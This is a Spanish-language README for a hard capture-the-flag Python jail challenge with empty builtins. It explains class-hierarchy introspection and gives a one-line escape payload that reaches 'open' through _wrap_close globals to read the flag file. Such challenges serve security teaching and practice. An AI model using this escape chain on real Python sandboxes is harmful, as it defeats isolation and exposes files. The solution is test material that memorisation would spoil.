# hard-misc-pyjail-strict

**Categoria:** Misc  
**Dificultad:** Hard  
**Puertos:** 9999 (jail interactivo), 80 (info web)

## Descripcion

Python jail de maxima seguridad. `__builtins__` esta completamente vacio: ninguna funcion builtin esta disponible — ni `print`, ni `open`, ni `dir`, ni `getattr`, ni `hasattr`.

La flag se encuentra en `/home/ctf/flag.txt`. El jugador debe escapar el sandbox usando unicamente la jerarquia de clases interna de Python.

## Concepto

El modelo de objetos de Python provee introspection a traves de atributos de clase que no dependen de builtins:
- `().__class__` — clase del objeto
- `().__class__.__base__` — clase base (`object`)
- `object.__subclasses__()` — lista de todas las subclases cargadas

Entre las subclases de `object` hay clases cuyos `__init__.__globals__` contienen referencias al modulo `builtins` real, incluyendo `open`.

## Solucion resumida

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()
```

## Setup local

```bash
docker-compose up --build
nc localhost 9999
```

## Archivos

- `app/jail.py` — el sandbox Python
- `app/server.py` — pagina informativa (puerto 80)
- `app/entrypoint.sh` — script de inicio
- `solve.py` — solucion completa
